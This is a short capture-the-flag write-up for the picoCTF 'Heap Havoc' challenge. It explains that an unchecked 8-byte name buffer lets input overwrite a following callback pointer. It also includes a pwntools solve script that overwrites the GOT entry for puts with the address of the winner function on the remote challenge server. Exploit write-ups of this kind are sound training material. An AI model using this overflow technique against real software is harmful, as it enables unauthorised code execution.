# HEAP HAVOC

## Solution
The challenge gives source code, yay! Essentially, there are no checks for how long the input arguments are, but `name` where each argument is written to in the structs are only 8 bytes long, and are before the callback. Thus, the solution is to simply write past the 8 bytes for name and set a callback to point to win.
The solve script I made does this by making the second `internet` struct overrride `puts.got` to point to `win`, though there are likely other, simpler options.

## Script
```py
from pwn import *;
exe = ELF("./vuln")

p = remote("foggy-cliff.picoctf.net", 57856)
p.sendlineafter(b"space:", b"a"*20 + p32(0x0804c028) + b' ' + p32(exe.symbols['winner']))
print(p.recvall())

p.interactive()
```